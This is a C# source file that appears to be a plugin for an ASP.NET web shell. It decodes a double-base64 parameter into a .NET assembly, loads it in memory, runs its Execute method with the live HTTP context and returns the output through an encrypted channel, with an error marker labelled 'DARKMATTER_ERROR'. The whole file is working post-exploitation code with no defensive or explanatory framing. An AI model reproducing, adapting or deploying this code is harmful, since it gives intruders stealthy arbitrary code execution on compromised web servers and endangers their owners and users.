using System;
using System.Web;
using System.IO;
using System.Diagnostics;
using System.Text;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Threading;

public class plugin
{
    private Dictionary<string, string> fnParseParams(string szParam)
    {
        Dictionary<string, string> dic = new Dictionary<string, string>();
        if (string.IsNullOrEmpty(szParam))
            return dic;

        string[] pairs = szParam.Split('&');
        foreach (string szPair in pairs)
        {
            int nIdx = szPair.IndexOf("=");
            if (nIdx > 0)
                dic[szPair.Substring(0, nIdx).Trim()] = szPair.Substring(nIdx + 1).Trim();
        }

        return dic;
    }

    private string fnB64Encode(string szInput) => Convert.ToBase64String(Encoding.UTF8.GetBytes(szInput));
    private string fnB64Decode(string szInput) => Encoding.UTF8.GetString(Convert.FromBase64String(szInput));

    private void fnWriteOutput(object driver, HttpResponse response, byte[] abOutput)
    {
        var cryptMethod = driver.GetType().GetMethod("Crypt", new Type[] { typeof(byte[]), typeof(int) });
        byte[] abEncryptedResp = (byte[])cryptMethod.Invoke(driver, new object[] {abOutput, 1});

        response.Clear();
        response.ContentType = "application/octet-stream";
        response.BinaryWrite(abEncryptedResp);
    }

    public bool Run()
    {
        HttpContext context = HttpContext.Current;
        if (context == null)
            return false;

        HttpRequest request = context.Request;
        HttpResponse response = context.Response;

        try
        {
            byte[] abPayload = (byte[])context.Items["payload"];
            object driver = context.Items["driver"];
            int nDllLength = (int)context.Items["len"];

            int nParamOffset = nDllLength + 4;
            int nParamLength = abPayload.Length - nParamOffset;
            string szParam = Encoding.UTF8.GetString(abPayload, nParamOffset, nParamLength).Trim();

            Dictionary<string, string> dic = fnParseParams(szParam);
            
            string z0 = dic.ContainsKey("z0") ? dic["z0"] : string.Empty;
            string z1 = dic.ContainsKey("z1") ? dic["z1"] : string.Empty;

            byte[] abFirst = Convert.FromBase64String(z0);
            byte[] abBuffer = Convert.FromBase64String(Encoding.UTF8.GetString(abFirst));

            string szJson = string.Empty;
            if (!string.IsNullOrEmpty(z1))
            {
                string sanitizedZ1 = HttpUtility.UrlDecode(z1, Encoding.UTF8);
                byte[] jsonBytes = Convert.FromBase64String(sanitizedZ1);
                szJson = Encoding.UTF8.GetString(jsonBytes);
            }

            Assembly asm = Assembly.Load(abBuffer);
            object targetInstance = null;
            MethodInfo execMethod = null;

            foreach (Type t in asm.GetTypes())
            {
                execMethod = t.GetMethod("Execute", new Type[] { typeof(object) });
                if (execMethod != null)
                {
                    targetInstance = Activator.CreateInstance(t);
                    break;
                }
            }

            if (targetInstance == null || execMethod == null)
            {
                throw new Exception("Target Class or Execute(Object) method not found in DLL.");
            }

            Dictionary<string, object> execParams = new Dictionary<string, object>();
            execParams.Add("context", context);
            execParams.Add("json", szJson);

            object resultObj = execMethod.Invoke(targetInstance, new object[] { execParams });

            byte[] resultBytes;
            if (resultObj != null)
            {
                resultBytes = Encoding.UTF8.GetBytes(resultObj.ToString());
            }
            else
            {
                resultBytes = new byte[0];
            }

            fnWriteOutput(driver, response, resultBytes);
        }
        catch (Exception ex)
        {
            response.Write("DARKMATTER_ERROR: " + ex.Message);
        }

        return true;
    }
}